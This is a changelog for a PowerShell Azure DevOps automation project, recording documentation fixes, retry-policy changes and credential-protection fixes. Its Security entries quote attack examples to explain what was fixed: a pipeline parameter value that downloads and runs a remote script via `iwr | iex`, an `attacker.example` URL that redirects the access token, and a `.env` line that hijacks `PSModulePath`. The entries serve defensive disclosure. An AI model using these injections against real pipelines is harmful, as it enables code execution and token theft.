# Changelog

All notable changes to this repository are recorded here.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this
project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

A version is meaningful here because the configuration schemas are a contract: a
breaking change to a schema is a major version, whatever the code did.

## [Unreleased]

### Fixed

- **Docs** — added `docs/reference/api-reference.md`, naming all 71 functions the
  foundation exports with the synopsis each declares in its own comment-based help. 53 of
  them appeared in no document at all, so the only way to learn whether a behaviour
  already existed was to open seven `.psm1` files — which is how the same helper gets
  written twice. Two tests keep it honest: one fails if an exported function is missing
  from the page, one fails if a synopsis there stops matching `Get-Help`.
- **Docs** — the README now links troubleshooting, names every family of environment
  variable rather than the three connection ones, lists the path overrides and the three
  widening switches, completes the repository layout with `.github/`, `.env.example`,
  `PSScriptAnalyzerSettings.psd1`, `.local/` and `artifacts/`, and states that running
  the gate needs Pester and PSScriptAnalyzer even though running the automations needs
  nothing but PowerShell.
- **Docs** — `rename` is documented as workstation-only in the README, `command-model.md`
  and `pipelines/README.md` §3. It was absent from the pipeline definitions and named in
  the command tables with nothing saying the two disagreed.
- **Docs** — `pipelines/README.md` is indexed in `docs/README.md` §3. The CI check only
  walks `docs/`, so an unindexed document outside it passed while the rule the index
  states — every document in this repository — did not hold.
- **Docs** — `CONTRIBUTING.md` §4 carried six of the seven Definition of done rows in
  `AGENTS.md` §5, missing *if the change adds a way to write, the guide says how to
  reverse it*. Two definitions of done in one repository is one too many.
- **Docs** — `-AllowUnqualifiedSecretName` now has a `.PARAMETER` block. It was the only
  parameter on the public surface with none, and it is the switch that turns off the
  protection stopping a DEV value from being written over a PROD credential. A comment
  in the `param()` block is not reachable from `Get-Help`.
- **Docs** — the `rename` line in the command ladder said *Requires `-ConfirmRename`*,
  where the code requires `-ConfirmApply` **and** `-ConfirmRename`. The `.PARAMETER`
  block twenty lines below said so correctly, which is the worse kind of inconsistency:
  both readings are in the same document.
- **Docs** — comment-based help added to `Complete-Step`, `Get-Value`, `Test-AllowedMatch`
  and `Get-ScannableFile`. `AGENTS.md` §7 requires help on every function; two of these
  had none at all.
- **Docs** — the test suite is described accurately again. `testing-strategy.md` listed
  four files totalling 68 tests; there are six files and 127, and the two missing ones
  are `Ado.Rest.Tests.ps1` and `Ado.Rest.RequestParameters.Tests.ps1` — a quarter of the
  suite, including the ten tests for the retry policy that the same document listed as
  *not covered*. The README's two counts are updated with it. A test-count claim nobody
  can reproduce teaches a reader to distrust the rest of the document.
- **Docs** — `testing-strategy.md` §4 said two PSScriptAnalyzer rules are excluded. Six
  are. Also corrected the note in `PSScriptAnalyzerSettings.psd1` claiming the codebase
  has no `Write-Host`: no `.ps1` or `.psm1` does, the pipeline YAML does, and the
  analyzer does not read YAML either way.
- **Docs** — `configuration-reference.md` described the environment variable for a secret
  Variable Group value as carrying the *same name as the variable in the group*. That is
  the rule the environment-qualified secret source replaced, and following it produced a
  group reported `blocked` with nothing in the reference explaining why. It now states
  the `<KEY>_<ENV>` form, the reason the environment qualifier exists, and what
  `-AllowUnqualifiedSecretName` is for.
- **Docs** — `.env.example` declared `APP_SERVER_HOST_DEV/QA/PROD` under a heading
  offering non-secret defaults. Nothing reads those variables: non-secret values come
  from the values CSV, and only secrets are read from the environment. The block also
  claimed an empty key stays at the sentinel, where an empty row in the CSV is in fact
  rejected. Replaced with the rule that actually applies.
- **Docs** — `naming.approverGroup` is removed from `project-context.json`, its schema,
  `conventions.md` and `configuration-reference.md`. It was declared, schema-checked and
  documented with a worked example, and no code has ever read it. Configuration that
  looks like a capability and is not is worse than an absent feature, because it is
  discovered only after someone depends on it.
- **Docs** — the retry policy in `capabilities.md` and in `azure-devops-notes.md` §12
  predated `Get-AdoRetryDecision` and contradicted the *Retry policy* section twenty-five
  lines further down the same file. Both now state the implemented rule: `GET`, `PUT` and
  `DELETE` only, `408`/`429`/`5xx` plus failures carrying no status, `Retry-After` capped
  at 120s — and attribute it to the function that decides it.
- **Foundation** — `POST` is no longer retried. The retry loop was method-agnostic, so a
  `502` or `504` arriving after the server had committed produced a duplicate Team,
  security group, Variable Group or Service Connection on the retry — and a duplicate is
  precisely what `Ado.Identity` and `Ado.Library` treat as a blocking condition. The
  resilience mechanism manufactured the one state the design refuses to guess about.
- **Foundation** — a failure carrying **no** HTTP status is now retried. DNS failures,
  TLS resets and timeouts are the most transient failures there are and were classified
  non-retryable, while `500` was retried. `408` is added to the retryable set.
- **Foundation** — an honoured `Retry-After` is capped at 120 seconds. A service or proxy
  answering `Retry-After: 999999` parked the run in `Start-Sleep` for eleven days.
- **Foundation** — when a transient failure lands on a `POST`, the error now says the
  retry was declined deliberately and that re-running is safe, rather than reading as a
  hard failure.

### Added

- **Foundation** — `Get-AdoRetryDecision`, the retry policy as a pure function over
  (method, status, `Retry-After`, attempt), with ten tests. The policy was previously only
  inferable by reading the loop.
- **Docs** — `docs/reference/azure-devops-notes.md` gains a retry policy section.

### Security

- **`variable-group-configuration`** — a Variable Group secret is now resolved from an
  **environment-qualified** variable: the secret `APP_SERVER_PASSWORD` in the PROD group
  reads `APP_SERVER_PASSWORD_PROD`. Previously it read the bare `APP_SERVER_PASSWORD`, and
  since the group name carries the environment while the secret's name does not — and the
  live value can never be read back to compare — a stale or DEV-valued
  `APP_SERVER_PASSWORD` in `.env` was written over the **PROD** credential by any `apply`
  that touched a non-secret key in that group. The API reported success and nothing could
  detect it afterwards. Pass `-AllowUnqualifiedSecretName` for a credential genuinely
  shared across environments; the qualified name still wins when both are set.
- **Foundation** — `isSecret` is compared against `$true` instead of cast with `[bool]`.
  In PowerShell `[bool]'false'` is `$true`, so a platform response carrying
  `"isSecret": "false"` would have been read as secret; the inverse — a secret misread as
  non-secret — copies its masked live value into the payload, and the `PUT` writes the
  mask over the credential. This is the one cast here whose failure mode is credential
  destruction.

### Fixed

- **Docs** — four documents claimed the sentinel was the only value ever overwritten, or
  that the module "never writes a secret value". Both were false for the secret re-post
  path. `SECURITY.md`, `AGENTS.md`, `docs/reference/security-model.md` and
  `docs/guides/variable-group-configuration.md` now separate the non-secret rule (the
  sentinel) from the secret rule (environment-qualified resolution), and the guide's
  rollback table no longer says a re-posted secret is "the value already in effect" — it
  is whatever the environment held.
- **Docs** — `.env.example` declares `APP_SERVER_PASSWORD_DEV|QA|PROD`. The one variable
  able to destroy a production credential was absent from the template that is supposed to
  be the credential checklist.
- **Docs** — `docs/process/risk-register.md` gains risk 6b. Risks 6 to 9 covered the
  *blanking* direction only; silent *replacement* was missing entirely.

**Breaking:** an existing `.env` using bare secret names will now block instead of
writing. Either rename each to `<NAME>_<ENVIRONMENT>`, or pass
`-AllowUnqualifiedSecretName`. Blocking is the intended behaviour, not a regression: the
previous run may have been writing the wrong value.

### Security

- **Pipelines** — queue-time parameters no longer reach a script body as template
  expressions. A template expression is expanded at compile time, so interpolating a
  free-text parameter into a script pastes the value in as source code; `applicationKey`,
  `organizationUrl` and `project` are all `type: string` with no closed value list, and
  all three were interpolated that way in jobs holding `ADO_PAT` and the SFTP
  credentials. A value of `x'; iwr http://host/payload.ps1 | iex; '` closed the quoting
  and ran on the agent, turning permission to queue a build into permission to read the
  token. Every parameter now arrives via `env:` and is read with `$env:PARAM_*`.
- **Pipelines** — every parameter is validated at run time before use: required ones must
  be non-empty, all must be single-line, and each is matched against an expected pattern
  (`organizationUrl` against the Azure DevOps URL shape, `applicationKey` against the
  schema's own `^[A-Za-z0-9][A-Za-z0-9_-]*$`, `environment` against `^[A-Z0-9_]+$`). The
  single-line check matters independently of the injection: even as data, a value with a
  newline would append arbitrary `KEY=VALUE` lines to `.env.pipeline`, enough to override
  `ADO_PAT`. `command` is re-checked against its closed list rather than trusting the
  parameter declaration to survive a future edit.

### Added

- **Tests** — four cases asserting that no pipeline interpolates a template expression
  outside an `env:` assignment, that each pipeline actually maps its parameters (so the
  first check cannot pass vacuously), and that every mapped parameter is read back out of
  the environment (so hardening cannot rot into dead mappings).

### Security

- **`variable-group-configuration`, `service-connection-provisioning`** — `apply` now
  requires `-ApplicationKey`. In both modules the parameter was a plain filter, so
  `apply -ConfirmApply` with no key wrote to every application in scope multiplied by
  every environment — six Variable Groups in the shipped example, PROD included, behind a
  single confirmation. `docs/reference/command-model.md` already stated the parameter was
  "Required by every writing verb", and the blast-radius argument in
  `docs/overview/scope-and-limits.md` depended on it; only `team-provisioning` enforced it.

### Fixed

- **All three automations** — the `-ApplicationKey` requirement is checked before the
  environment file is read and before the first request. `team-provisioning` already had
  the check but ran it after connecting, so a run with no key reported
  `Environment file not found: .env` instead of the missing argument — and had already
  read the token by the time it complained. The set of commands it applies to is
  unchanged for `team-provisioning` (`plan`, `smoke`, `apply`, `reconcile`, `rename`).
- **Docs** — `docs/reference/command-model.md` now states which verbs require the
  parameter per module, rather than a blanket claim two of three modules did not meet.

Residual, stated rather than left implicit: requiring `-ApplicationKey` narrows an
`apply` to one application but **not** to one environment, so DEV, QA and PROD for that
application remain in a single `apply`. Pass `-Environment` as well to narrow further.
The documented contract only ever promised the application boundary.

### Security

- **`service-connection-provisioning`** — an SSH private key is no longer copied into the
  Service Connection's `data` bag. `data` is returned in clear text by
  `GET _apis/serviceendpoint/endpoints` to every identity with read access to the project,
  so a key written there was readable by anyone who could read the endpoint, and appeared
  in any inventory built from an endpoint read. The key is now sent only as
  `authorization.parameters.privateKey`, which GET never returns. Connections created
  before this change should have their keys rotated, because the old key was exposed for
  as long as the connection has existed.
- **Foundation** — redaction now also covers `passphrase`, `connectionstring`, `connstr`,
  `sshkey`, `signingkey`, `accesskey`, `keymaterial` and `signature`. Every one of those
  names previously passed through in clear text, so a Variable Group secret named
  `SFTP_KEY` or `DB_CONNSTR` had its resolved value written to `artifacts/`.
- **Foundation** — `Import-AdoAsCodeEnvironment` validates the *name* of every variable
  it loads. A name must match `^[A-Za-z_][A-Za-z0-9_]*$`, and the names that steer the
  interpreter (`PSModulePath`, `Path`, `PSExecutionPolicyPreference`, `PSHOME`,
  `PATHEXT`, `ComSpec`, `DOTNET_STARTUP_HOOKS`, `DOTNET_ADDITIONAL_DEPS`, `LD_PRELOAD`,
  `LD_LIBRARY_PATH`) are refused. Previously any name was accepted, which made `.env` a
  code execution path rather than a configuration one: a line reading
  `PSModulePath=\somewhere\share` was applied verbatim and honoured by the next
  `Import-Module` in `foundation/Import-Foundation.ps1`. Both refusals throw rather than
  skip the line, so a run cannot proceed with a half-loaded environment.

- **Foundation** — the organization URL is validated before the Personal Access Token is
  aimed at it. `https` is now required, and the host must be `dev.azure.com`, a
  `*.visualstudio.com` host, or one named explicitly in `-AllowedHost`. Previously only
  the last path segment was checked, so `http://` was accepted (putting the token on the
  network in clear text) and so was `https://attacker.example/dev.azure.com/contoso` —
  which resolved to organization `contoso` and sent every `Core` request, token attached,
  to `attacker.example`, while the `Identity` requests went to the real service, so the
  run partly succeeded and looked legitimate.

- **Foundation** — no request follows a redirect while carrying the credential.
  `MaximumRedirection` is now 0 on both `Invoke-AdoRest` and the paged reader. Windows
  PowerShell 5.1 — the support floor declared in every manifest — forwards
  caller-supplied headers verbatim across a redirect, cross-origin included, and has no
  `-PreserveAuthorizationOnRedirect` to disable it, so any 3xx from a captive portal or
  a misconfigured gateway was handed the Personal Access Token. A redirect is not an
  expected answer from this API.

### Fixed

- **Foundation** — every request is bounded by `-TimeoutSec`. There was no timeout on
  either call, so an unresponsive endpoint parked an `apply` indefinitely with nothing
  to observe.
- **Foundation** — `Remove-SensitiveValue` no longer redacts property names that merely
  contain a sensitive substring. An unanchored `pat` matched `areaPaths`,
  `iterationPaths`, `reportPath`, `patch` and `compatible`, so every `team-provisioning`
  `inventory` report replaced its Area Path and Iteration Path inventory — the data the
  report exists to carry — with `[redacted]`, silently. Short, ambiguous tokens (`pat`,
  `key`, `sas`, `cert`, `auth`, `bearer`) now match only as a whole name or a whole
  `_`/`-` delimited segment.
- **Foundation** — `Remove-SensitiveValue` no longer collapses a single-element list into
  a bare value. PowerShell enumerates a function's output, so a one-item inventory list
  was serialised into the report as a string instead of an array, changing the shape of
  the evidence file.
- **CI** — the `documentation` job no longer fails on a document that contains no
  relative links. `grep` exits 1 when it matches nothing, and under `set -o pipefail`
  that became the pipeline's status, so `|| failed=1` fired on a *clean* file. Four ADRs
  triggered it, which means the job had been red while printing only
  `Documentation check failed.` — a failing gate that named nothing, which is the
  failure mode most likely to train people to ignore it.
- **CI** — the link check now reports every broken link instead of the first one per
  file. Its `exit 1` was inside a pipeline subshell, so it left the subshell rather than
  the job, and a genuine broken link was indistinguishable from the false positive above.
- **CI** — the index check matches the file name as a fixed string (`grep -F`). It was
  treated as a regex, so the dots in a file name were wildcards.

### Added

- **Foundation** — `New-AdoRequestParameter`, the request splat as a pure function, so
  the redirect and timeout protections are covered by a test instead of trusted. Both are
  invisible when missing: a request with neither behaves normally against a healthy
  service.
- **Tests** — `tests/foundation/Ado.Rest.RequestParameters.Tests.ps1`, six cases,
  including one asserting both protections survive on the body-carrying branch.
- **Foundation** — `Assert-AdoOrganizationUrl`, exported so a caller can validate a URL
  before building a context.
- **Tests** — `tests/foundation/Ado.Rest.Tests.ps1`, the first tests for `Ado.Rest`.
  Sixteen cases covering URL validation, organization-name derivation, Basic header
  construction and `Remove-SecretFromText` — the last of which
  `docs/process/risk-register.md` credits as a control and which had no test at all.
- **Foundation** — `New-AdoSshServiceEndpointPayload`, the Service Connection request body
  as a pure function. Split out of `New-AdoSshServiceEndpoint` so credential placement can
  be asserted without a round trip; seven tests cover it, one of which renders the whole
  payload with `authorization` removed and fails if a credential appears anywhere in the
  remainder.

**Breaking for on-premises users:** an Azure DevOps Server URL now requires
`-AllowedHost`. Azure DevOps Services URLs are unaffected.

Report content changes for the better: paths that were `[redacted]` now appear, and
credential-named fields that appeared now do not. `plan` output is otherwise unchanged
for unchanged input.

## [1.0.0] - 2026-01

First public release.

### Added

**Foundation** — seven PowerShell modules with manifests and explicit exports.

- `Ado.Rest` — connection context, URL construction with the api-version applied once,
  request execution with exponential backoff on `429` and `5xx` only, continuation-token
  paging, and error messages carrying the service's own explanation with credentials
  masked.
- `Ado.Identity` — identity resolution that refuses to guess between ambiguous matches,
  Teams, memberships, Team administrators, project security groups.
- `Ado.Work` — classification nodes, team work settings, and the Board column
  reconciliation engine: three-stage matching to reuse an existing column id, undeclared
  columns preserved and re-typed before the outgoing column, and drift defined against
  the payload that would be sent.
- `Ado.Library` — Variable Groups written without destroying their secrets, and SSH
  Service Connections created without overwriting an existing credential.
- `AdoAsCode.Configuration` — `.env` loading, and JSON Schema validation that actually
  runs, with a reduced validator on Windows PowerShell 5.1 that reports which engine
  was used.
- `AdoAsCode.Plan` — the shared plan model with a closed action and status vocabulary,
  and the single gate that refuses to apply a blocked plan.
- `AdoAsCode.Report` — plan reports as JSON and Markdown, incremental apply receipts,
  and redaction applied at the writer rather than at each call site.

**Automations** — three modules, each meeting the seven-item contract.

- `team-provisioning` — Teams, members, Area and Iteration Paths, team work
  configuration, Board columns; `validate`, `inventory`, `plan`, `smoke`, `apply`,
  `reconcile`, `rename`.
- `variable-group-configuration` — Variable Groups from a declared scope and a CSV of
  non-secret values, with per-environment forbidden keys.
- `service-connection-provisioning` — SSH/SFTP connections created with the
  configuration sentinel when no credential is available locally.

**Operations**

- One Azure DevOps pipeline definition per automation: `trigger: none`, a closed command
  list, a separate confirmation parameter for `apply`, secrets materialised at run time,
  artefacts published with `condition: always()`.
- `scripts/bootstrap.ps1`, `scripts/Invoke-Tests.ps1`, `scripts/Test-NoSensitiveData.ps1`.
- GitHub Actions running the identical quality gate on `windows-latest`, plus a
  documentation job that fails on an unindexed document or a broken relative link.

**Tests** — 68 Pester tests covering the board column engine, Variable Group and
connection write safety, the plan model, configuration loading, redaction, the
automation contract, and offline validation with the credential variables cleared.

**Documentation** — problem statement, capability catalogue, scope and limits, glossary,
five guides, six process documents, seven reference documents, six architecture decision
records, and generated example artefacts.

### Security

- Configuration declares the **name** of the environment variable carrying a secret,
  never its value, so the whole declaration is committable.
- The only value any automation overwrites is `PENDING_OWNER_CONFIGURATION`.
- A write to a Variable Group containing secrets re-posts every secret in the same
  request, or is refused. Azure DevOps stores an omitted value as an empty string, so
  the naive implementation deletes the credential and reports success.
- An existing Service Connection is never modified without both `-ForceUpdate` and
  `-ForceCredentialOverwrite`. A rename is not implemented at all.
- Reports and receipts pass through redaction matched on property **name**, so a weak
  password is redacted along with an obvious one.
- A two-layer sensitive data gate runs on every commit: structural rules committed with
  the repository, and a literal deny list kept outside version control — organization
  and host names are themselves sensitive, so they must not live inside the script that
  looks for them.

### Notes on provenance

Generalised from production work managing an Azure DevOps project. Everything specific
to that environment was removed rather than renamed, and two structural problems the
original had were fixed rather than carried over:

- A single 3,000-line entry point became three modules over a shared layer that carries
  no domain rules.
- Four test scripts with no runner — several of whose assertions had been false for
  weeks without failing, because nothing ran them — became one Pester suite behind one
  command, executed identically by continuous integration.
